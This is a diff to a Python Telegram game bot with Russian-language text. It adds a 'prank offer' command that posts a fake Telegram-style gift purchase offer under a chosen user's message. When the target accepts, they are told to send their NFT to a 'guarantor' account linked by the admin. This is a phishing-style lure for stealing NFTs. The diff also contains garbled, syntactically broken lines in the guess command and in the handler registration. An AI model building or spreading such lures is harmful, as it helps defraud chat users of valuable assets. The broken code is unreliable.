@@ -19,6 +19,7 @@ DEFAULT_WIN_CHANCE = 0.4
 DEFAULT_COOLDOWN = 60  
 DATA_FILE = "bot_data.json"
 DEFAULT_TIMER = 60
+PRANK_LINK = "https://t.me/xucosy" # ТВОЙ НИК ДЛЯ ПРАНКА
 # =============================================
 
 logging.basicConfig(level=logging.INFO)
@@ -63,6 +64,7 @@ def get_main_menu_keyboard():
         [InlineKeyboardButton("👑 Запустить Царь горы", callback_data='setup_king')],
         [InlineKeyboardButton("🎯 Запустить Угадай число", callback_data='setup_guess')],
         [InlineKeyboardButton("🎰 Запустить Лудку 777", callback_data='setup_lucky777')],
+        [InlineKeyboardButton("🤡 Создать пранк-оффер", callback_data='prank_setup')],
         [InlineKeyboardButton("⏱ 30 сек", callback_data='time_30'), InlineKeyboardButton("⏱ 1 мин", callback_data='time_60')],
         [InlineKeyboardButton("⏱ 3 мин", callback_data='time_180'), InlineKeyboardButton("⏱ 5 мин", callback_data='time_300')],
         [InlineKeyboardButton("🎲 Шанс мишки", callback_data='change_chance')],
@@ -271,11 +273,9 @@ async def casino_button_handler(update: Update, context: ContextTypes.DEFAULT_TY
         emoji, price = clicked_prize.split('_')[0], clicked_prize.split('_')[1]
         won_prize_text = f"{emoji} (Стоимость: {price} ⭐)"
 
-    # Убираем кнопки со старого сообщения (вскрываем ячейки)
     try: await query.message.edit_reply_markup(reply_markup=new_keyboard)
     except Exception: pass
 
-    # Отправляем результат НОВЫМ сообщением
     if won:
         win_text = f"🎉🥳 <b>ПОБЕДА!</b> 🥳🎉\n\n🏆 {game['user_link']} открыл ячейку и забирает:\n🎁 <b>{won_prize_text}</b>\n\n📩 Свяжитесь с админом! @твой_ник_админа"
         try: await context.bot.send_message(chat_id=query.message.chat_id, text=win_text, parse_mode="HTML")
@@ -324,6 +324,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if active_event: await query.answer("⚠️ Другой ивент уже идет!", show_alert=True); return
         context.user_data['setup_step'] = 'lucky777_prize'
         await query.edit_message_text("🎁 Напиши приз для «Лудки 777»:", reply_markup=get_back_keyboard())
+    elif query.data == 'prank_setup':
+        context.user_data['setup_step'] = 'prank_nft'
+        await query.edit_message_text("🤡 <b>Настройка пранка</b>\n\nШаг 1: Отправь мне картинку NFT (или напиши его название):", parse_mode="HTML", reply_markup=get_back_keyboard())
     elif query.data in ['range_100', 'range_1000']:
         context.user_data['guess_range'] = 100 if query.data == 'range_100' else 1000
         context.user_data['setup_step'] = 'guess_number'
@@ -343,6 +346,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == 'back_to_menu':
         context.user_data['setup_step'] = None
         await query.edit_message_text(text=f"👑 <b>Админ-панель</b>\n\nВремя: <b>{data.get('timer')} сек.</b>\nШанс: <b>{data.get('win_chance')}%</b>\nКулдаун: <b>{data.get('cooldown')} мин.</b>", reply_markup=get_main_menu_keyboard(), parse_mode="HTML")
+
+    elif query.data == 'prank_accept':
+        await query.edit_message_caption(caption="✅ <b>Сделка инициирована!</b>\n\nПодарок зарезервирован. Чтобы получить оплату, отправьте ваш NFT нашему гаранту (нажмите кнопку ниже):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Перейти к гаранту", url=PRANK_LINK)]]), parse_mode="HTML")
+    elif query.data == 'prank_reject':
+        await query.edit_message_caption(caption="❌ Вы отклонили предложение.", parse_mode="HTML")
 
 async def admin_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global active_event, secret_number, current_prize, current_king_id, current_king_name, lucky777_prize
@@ -404,10 +412,68 @@ async def admin_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
         except: pass
         await update.message.reply_text("✅ Запущено!", reply_markup=get_main_menu_keyboard())
         return
+    
+    # НОВЫЕ ШАГИ ДЛЯ ПРАНКА
+    elif step == 'prank_nft':
+        context.user_data['prank_nft_name'] = text
+        context.user_data['prank_photo'] = None 
+        context.user_data['setup_step'] = 'prank_price'
+        await update.message.reply_text("✅ Название принято!\n\n💰 Шаг 2: Напиши точную сумму и валюту (например: 200 ⭐, 5 TON, 10 грамм):", reply_markup=get_back_keyboard())
+        return
+    elif step == 'prank_price':
+        context.user_data['prank_price'] = text
+        context.user_data['setup_step'] = None
+        await update.message.reply_text("✅ Настройка готова!\n\nТеперь зайди в чат, ответь на сообщение друга и напиши команду /send_offer.", reply_markup=get_main_menu_keyboard())
+        return
+
+async def admin_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != ADMIN_ID or update.message.chat.type != 'private': return
+    if context.user_data.get('setup_step') == 'prank_nft':
+        context.user_data['prank_photo'] = update.message.photo[-1].file_id
+        context.user_data['prank_nft_name'] = "Крутой NFT"
+        context.user_data['setup_step'] = 'prank_price'
+        await update.message.reply_text("✅ Картинка сохранена!\n\n💰 Шаг 2: Напиши точную сумму и валюту (например: 200 ⭐, 5 TON, 10 грамм):", reply_markup=get_back_keyboard())
+
+async def cmd_send_offer(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != ADMIN_ID: return
+    if not update.message.reply_to_message:
+        await update.message.reply_text("❌ Эта команда должна быть ответом на сообщение друга в чате!")
+        return
+    
+    target_name = update.message.reply_to_message.from_user.first_name
+    target_id = update.message.reply_to_message.message_id
+    chat_id = update.message.chat_id
+    
+    nft = context.user_data.get('prank_nft_name', 'Ценный NFT')
+    price = context.user_data.get('prank_price', '200 ⭐')
+    photo = context.user_data.get('prank_photo')
+    
+    # Текст точь-в-точь как на скрине
+    text = (
+        f"<b>Пользователь {target_name} предлагает\n"
+        f"Вам {price} за подарок\n"
+        f"{nft}.</b>"
+    )
+    
+    keyboard = [[
+        InlineKeyboardButton("❌ Отклонить", callback_data="prank_reject"),
+        InlineKeyboardButton("✅ Принять", callback_data="prank_accept")
+    ]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        if photo:
+            await context.bot.send_photo(chat_id=chat_id, photo=photo, caption=text, reply_markup=reply_markup, parse_mode="HTML", reply_to_message_id=target_id)
+        else:
+            await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="HTML", reply_to_message_id=target_id)
+        await update.message.reply_text("🚀 Оффер успешно отправлен в чат!")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Ошибка отправки: {e}")
 
 async def cmd_start_guess(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.from_user.id != ADMIN_ID or active_event: return
-    context.user_data['setup_step'] = 'guess_range'
+   op if update.message.from_user.id != ADMIN))
+_ID or active   _event: return
+    context app.user_data['setup_step']_bot = 'guess_range'
     await update.message.reply_text("🎯 Выбери диапазон:", reply_markup=get_range_keyboard())
 
 async def cmd_start_king(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -434,14 +500,15 @@ def main():
     app_bot.add_handler(CommandHandler("start", start_cmd))
     app_bot.add_handler(CommandHandler("startguess", cmd_start_guess))
     app_bot.add_handler(CommandHandler("startking", cmd_start_king))
-    app_bot.add_handler(CommandHandler("stop", cmd_stop))
-    app_bot.add_handler(CommandHandler("stats", stats)) 
+    app_bot.add_handler(CommandHandler("stop", cmd_st.add_handler(CommandHandler("stats", stats)) 
     app_bot.add_handler(CommandHandler("price", announce_price))
-    app_bot.add_handler(CallbackQueryHandler(button_handler, pattern="^(time_|setup_|range_|end_event|change_|show_commands|back_to_menu)"))
+    app_bot.add_handler(CommandHandler("send_offer", cmd_send_offer))
+    app_bot.add_handler(CallbackQueryHandler(button_handler, pattern="^(time_|setup_|range_|end_event|change_|show_commands|back_to_menu|prank_)"))
     app_bot.add_handler(CallbackQueryHandler(casino_button_handler, pattern="^casino_click_"))
     app_bot.add_handler(CallbackQueryHandler(ignore_handler, pattern="^ignore$"))
     app_bot.add_handler(MessageHandler(filters.Dice.ALL, on_dice))
     app_bot.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE & filters.User(user_id=int(ADMIN_ID)), admin_text_handler))
+    app_bot.add_handler(MessageHandler(filters.PHOTO & filters.ChatType.PRIVATE & filters.User(user_id=int(ADMIN_ID)), admin_photo_handler))
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.ChatType.PRIVATE, on_message))
     print("Бот запущен...")
     app_bot.run_polling()
